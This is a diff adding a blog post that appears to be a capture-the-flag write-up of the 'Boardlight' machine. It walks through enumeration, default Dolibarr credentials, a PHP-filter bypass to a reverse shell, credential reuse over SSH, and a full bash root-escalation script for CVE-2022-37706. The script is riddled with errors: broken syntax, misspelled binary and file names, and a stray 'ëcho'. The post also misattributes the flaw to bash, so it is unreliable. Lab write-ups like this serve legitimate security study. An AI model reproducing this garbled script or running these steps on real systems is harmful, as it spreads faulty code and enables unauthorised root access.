@@ -1,0 +1,127 @@
+---
+layout: post
+title: "Boardlight 035d30a2de5d4052ac9b1c549f5e87b1"
+date:   2025-07-12 12:05:57 -0400
+categories: writeups
+---
+
+# Boardlight
+
+# 1. Enumeration
+
+We start with nmap scanning, two ports open, one of them a web application
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled.png' | relative_url }})
+
+Let’s see what is this about, previously the dns recognition was unsuccessful, but thanks to the contact information we can see the domain
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_1.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_2.png' | relative_url }})
+
+So we proceed to find a subdomain using three different tools
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_3.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_4.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_5.png' | relative_url }})
+
+Dolibar sign-in as usually we need to discard obvious vulnerabilities as default credentials, and we bypass login interface
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_6.png' | relative_url }})
+
+# 2. User flag
+
+We’ve got the version of the software before, after searching on google we found there’s a vulnerability where someone with determine permissions can obtain RCE **(CVE-2023-30253)**
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_7.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_8.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_9.png' | relative_url }})
+
+Go to create a new website 
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_10.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_11.png' | relative_url }})
+
+The vulnerability consists in edit HTML source, apparently we can’t use php code because we don’t have those permissions but if we try to use variants like “Php, phP, pHp” this filter will be bypassed, using a normal reverse shell we could get a shell as `data`
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_12.png' | relative_url }})
+
+Looking for config files where data has reading permissions we found credentials for the database
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_13.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_14.png' | relative_url }})
+
+If we try to break into the database, it would be useless because it has tons of tables, and users registered are admin:admin that we guess before
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_15.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_16.png' | relative_url }})
+
+Try to use those creds on ssh and got the user flag 
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_17.png' | relative_url }})
+
+# 3.Priv esc
+
+Using linpeas to enumerate the system we found a set uid binary in a path, casualty one of the directories of the path has almost the same of the machine it could be promising
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_18.png' | relative_url }})
+
+There is a vulnerability
+
+CVE-2022-37706 in bash, basically the system library function mishandles path names that begin with /dev/.. substring
+
+```bash
+#!/usr/bin/bash
+
+#This code is trying to search a specific vulnerable SUID 
+#if if find it, it try to leverage it to obtain full access
+
+echo "CVE-2022-37706"
+echo "[*]Trying to find the file of the vulnerable SUID"
+
+#It search through the whole file system with string "enlightenment_sys"
+#which has the following permises: SUID (-4000).
+#Redirects all errors to /dev/null
+
+file =$(find / -name enlightment_sys -perm -4000 2>/dev/null | head -1)
+
+if[[ -z ${file} ]]
+then 
+	echo "[- Couldn't find the vulnerable SUID file...]"
+	echo "[*] Enlightment should be installed on your system"
+	exit 1
+	
+fi
+
+echo "[+] Vulnerable SUID binery found!!"
+echo "[+] Trying to pop up a root shell"
+
+#It creates necessary directories to the exploit 
+mkdir -b /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit 
+
+ëcho "[+] Welcome to the rabbit holee!!"
+
+${file} /bin/mount -o \noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,iud=(id -u),\"/dev/../tmp/;/tmp/expoit" /tmp///net
+
+read -p "press any key to clean"
+
+sleep 5 
+rm -rf /tmp/exploit
+rm -rf /tmp/net
+
+echo -e "Done"
+
+```
+
+![Untitled]({{ '/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_19.png' | relative_url }})
